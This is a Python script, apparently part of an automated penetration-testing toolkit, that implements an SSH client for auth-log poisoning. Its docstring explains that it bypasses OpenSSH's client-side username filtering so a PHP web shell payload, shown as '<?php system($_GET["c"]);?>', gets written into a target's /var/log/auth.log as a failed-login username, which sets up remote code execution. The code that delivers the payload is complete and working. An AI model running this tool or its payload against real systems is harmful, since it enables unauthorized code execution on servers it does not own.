#!/usr/bin/env python3
"""legacy-ssh — paramiko-backed SSH client for auth-log poisoning.

Purpose
-------
OpenSSH >= 8.2 filters usernames that contain non-printable / shell-meta
characters on the **client** side (`ssh_connect2` in misc.c), so payloads
like `'<?php system($_GET["c"]);?>'@target` never even reach the remote
sshd, meaning `/var/log/auth.log` on the target never records them.

Paramiko speaks SSH at the protocol level and performs no such filtering.
This wrapper exposes just enough OpenSSH-CLI compatibility for the skills
(`sshpass -p x legacy-ssh -o ... -p PORT USER@HOST [CMD]`) to drive it
transparently. The *username* is the payload; authentication failure is
the expected outcome — sshd still writes the full username string into
auth.log before rejecting the attempt, which is all we need.

Supported CLI (subset, ssh(1)-compatible enough for our callers):
    legacy-ssh [-o NAME=VAL]... [-p PORT] [-v|-q|-T|-N|-4|-6|-C] USER@HOST [COMMAND...]

`-o` entries and any trailing COMMAND are silently discarded.
`sshpass -p <pw>` wrapping is harmless — this program never reads its
pty, so sshpass simply exec()s us and waits.

Exit codes:
    0  — banner + userauth_request sent (poison delivered, or at least
         reached the remote sshd enough for it to log the attempt).
    1  — TCP connect failed / SSH banner exchange failed before auth.
    2  — CLI usage error.
"""
from __future__ import annotations

import socket
import sys


def _parse_argv(argv: list[str]) -> tuple[str, int, str | None]:
    """Return (target, port, error_msg). target is 'user@host' or ''."""
    port = 22
    target: str | None = None
    i = 0
    n = len(argv)
    while i < n:
        a = argv[i]
        if a == "-o":
            i += 2
            continue
        if a == "-p":
            try:
                port = int(argv[i + 1])
            except (IndexError, ValueError):
                return "", 22, f"-p expects integer, got {argv[i+1:i+2]!r}"
            i += 2
            continue
        if a in ("-i", "-l", "-F", "-E", "-L", "-R", "-D", "-W", "-S",
                 "-J", "-B", "-b", "-c", "-e", "-I", "-m", "-O", "-Q",
                 "-w"):
            i += 2
            continue
        if a.startswith("-"):
            i += 1
            continue
        target = a
        i += 1
        break
    if not target:
        return "", port, "missing USER@HOST positional argument"
    if "@" not in target:
        return "", port, f"target must be USER@HOST, got {target!r}"
    return target, port, None


def main(argv: list[str]) -> int:
    target, port, err = _parse_argv(argv)
    if err:
        sys.stderr.write(f"legacy-ssh: {err}\n")
        return 2
    user, host = target.split("@", 1)

    try:
        import paramiko
    except ImportError as e:
        sys.stderr.write(f"legacy-ssh: paramiko not installed: {e}\n")
        return 1

    try:
        sock = socket.create_connection((host, port), timeout=5)
    except OSError as e:
        sys.stderr.write(f"ssh: connect to host {host} port {port}: {e}\n")
        return 1

    transport = paramiko.Transport(sock)
    try:
        try:
            transport.start_client(timeout=5)
        except Exception as e:
            sys.stderr.write(f"kex_exchange_identification: {e}\n")
            return 1

        try:
            transport.auth_password(user, "x")
        except paramiko.AuthenticationException:
            sys.stderr.write(
                f"{user}@{host}: Permission denied (publickey,password).\n"
            )
        except paramiko.SSHException as e:
            sys.stderr.write(f"{user}@{host}: {e}\n")
        except Exception as e:
            sys.stderr.write(f"{user}@{host}: auth error: {e}\n")
    finally:
        try:
            transport.close()
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
